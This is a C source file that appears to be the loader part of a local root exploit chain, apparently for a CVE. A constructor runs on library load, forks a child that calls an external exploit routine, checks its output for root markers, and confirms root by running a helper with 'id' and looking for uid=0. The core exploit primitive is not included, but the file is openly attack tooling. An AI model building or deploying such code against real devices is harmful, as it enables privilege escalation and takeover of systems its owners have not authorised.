#define _GNU_SOURCE

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

_Noreturn void a536_exploit(void);

static int root_helper_id(const char *helper, char *proof, size_t proof_size) {
  int pair[2];
  pid_t child;
  ssize_t total = 0;
  int status = 0;
  pid_t waited;

  if (pipe(pair))
    return 0;
  child = fork();
  if (child < 0) {
    close(pair[0]);
    close(pair[1]);
    return 0;
  }
  if (!child) {
    if (dup2(pair[1], STDOUT_FILENO) < 0 || dup2(pair[1], STDERR_FILENO) < 0)
      _exit(126);
    close(pair[0]);
    close(pair[1]);
    execl(helper, helper, "-c", "id", NULL);
    _exit(127);
  }
  close(pair[1]);
  while ((size_t)total + 1 < proof_size) {
    ssize_t got = read(pair[0], proof + total, proof_size - 1 - total);

    if (got < 0 && errno == EINTR)
      continue;
    if (got <= 0)
      break;
    total += got;
  }
  proof[total] = 0;
  close(pair[0]);
  do {
    waited = waitpid(child, &status, 0);
  } while (waited < 0 && errno == EINTR);
  return waited == child && WIFEXITED(status) && !WEXITSTATUS(status) &&
         strstr(proof, "uid=0") != NULL;
}

static void read_context(char *context, size_t size) {
  FILE *file = fopen("/proc/self/attr/current", "r");

  context[0] = 0;
  if (!file)
    return;
  if (fgets(context, size, file))
    context[strcspn(context, "\r\n")] = 0;
  fclose(file);
}

static int verify_root(const char *helper, char *proof, size_t proof_size) {
  for (int attempt = 0; attempt < 20; ++attempt) {
    if (root_helper_id(helper, proof, proof_size))
      return 1;
    usleep(100000);
  }
  return 0;
}

__attribute__((constructor)) static void a536_payload(void) {
  static int started;
  const char *root_helper;
  int pair[2];
  pid_t chain;
  FILE *stream;
  char line[1024];
  char proof[512];
  char context[128];
  int root_seen = 0;
  int chain_ready = 0;

  if (started)
    return;
  started = 1;
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  root_helper = getenv("CVE43499_ROOT_HELPER");
  if (!root_helper || !*root_helper || access(root_helper, X_OK)) {
    fprintf(stderr, "A536_APP_FAIL root helper errno=%d %s\n", errno,
            strerror(errno));
    _exit(1);
  }
  if (pipe(pair)) {
    fprintf(stderr, "A536_APP_FAIL pipe errno=%d %s\n", errno, strerror(errno));
    _exit(1);
  }
  chain = fork();
  if (chain < 0) {
    fprintf(stderr, "A536_APP_FAIL fork errno=%d %s\n", errno, strerror(errno));
    _exit(1);
  }
  if (!chain) {
    if (dup2(pair[1], STDOUT_FILENO) < 0 || dup2(pair[1], STDERR_FILENO) < 0)
      _exit(126);
    close(pair[0]);
    close(pair[1]);
    a536_exploit();
  }
  close(pair[1]);
  stream = fdopen(pair[0], "r");
  if (!stream) {
    fprintf(stderr, "A536_APP_FAIL fdopen errno=%d %s\n", errno,
            strerror(errno));
    _exit(1);
  }
  read_context(context, sizeof(context));
  printf("A536_APP_START uid=%d euid=%d pid=%d chain=%d context=%s\n", getuid(),
         geteuid(), getpid(), chain, context);
  while (fgets(line, sizeof(line), stream)) {
    fputs(line, stdout);
    if (!strncmp(line, "ROOT_OK", 7))
      root_seen = 1;
    if (root_seen && !strncmp(line, "chain ready", 11)) {
      chain_ready = 1;
      break;
    }
    if (!strncmp(line, "CHAIN_FAIL", 10) || !strncmp(line, "ARW_FAIL", 8) ||
        !strncmp(line, "ROOT_FAIL", 9)) {
      fprintf(stderr, "A536_APP_FAIL chain rejected\n");
      _exit(1);
    }
  }
  if (!root_seen || !chain_ready) {
    fprintf(stderr, "A536_APP_FAIL chain ended root=%d ready=%d\n", root_seen,
            chain_ready);
    _exit(1);
  }
  fclose(stream);
  if (!verify_root(root_helper, proof, sizeof(proof))) {
    fprintf(stderr, "A536_APP_FAIL root proof=%s\n", proof);
    _exit(1);
  }
  printf("A536_APP_ROOT_PROOF %s", proof);
  if (!strchr(proof, '\n'))
    putchar('\n');
  printf("done=1 root=1\nexploit completed\n");
}
